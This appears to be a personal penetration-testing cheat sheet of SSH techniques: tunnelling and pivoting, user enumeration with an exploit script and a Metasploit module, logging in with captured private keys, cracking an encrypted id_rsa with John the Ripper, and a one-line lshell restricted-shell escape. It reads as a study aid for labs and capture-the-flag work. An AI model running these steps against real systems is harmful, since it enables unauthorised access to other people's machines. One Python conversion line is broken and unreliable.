---
tags: 🔻 🔻/Enumeration/ssh
aliases: Hacking Notes
---
# SSH Scripts

## SSH Tunneling / Pivoting


### sshuttle  
#sshshuttle

sshuttle -vvr user@x.x.x.x  
  
  

## Local port forwarding

  
ssh gateway -L local port to listen:remote host:remote port  
  


## Remote port forwarding


  
ssh gateway -R remote port to bind:local host:local port 
  


## Dynamic port forwarding

ssh -D local proxy port -p remote port target  
  
  

# enum_ssh
#enum_ssh
  

## SSH user enumeration
#ssh_user_enum
  
1)  
python ./40136.py x.x.x.x  
  
  
  
2)  
msf > use auxiliary/scanner/ssh/ssh\_enumusers  
msf auxiliary(scanner/ssh/ssh\_enumusers) > set RHOSTS x.x.x.x  
RHOSTS => x.x.x.x  
msf auxiliary(scanner/ssh/ssh\_enumusers) > set USER\_FILE /usr/share/wordlists/metasploit/unix\_users.txt  
USER\_FILE => /usr/share/wordlists/metasploit/unix\_users.txt  
msf auxiliary(scanner/ssh/ssh\_enumusers) > run



# Login with RSA 
#ssh #id_rsa

chmod 600 *ssh key*  
chmod 400 id_rsa  
ssh -i id_rsa *user*@*ip*  
ssh *user*@*ip* -i *private key* 
or
ssh -o StrictHostKeychecking=no -i *private key* *user*@*ip*
# Decrypt RSA
#ssh #decrypt_id_rsa #john
Vigerner Cipher  
  
encrypted id_rsa ....  
key to decrypt  
  
python ssh2john.py id_rsa > id_john {convert John decrpt format}  
  
john id_john --wordlist=/usr/share/wordlists/rockyou.txt  
    
  
Decrypting RSA for given p,q,e and ct (cyphertext)  
rsadecrypt.py  
Result - PlainText (Long number)  
  
Convert PT to hex  
python -c "print(PT,'x').decode('hex')"

# lshell bypass
#lshell_bypass #ssh

echo os.system('/bin/bash')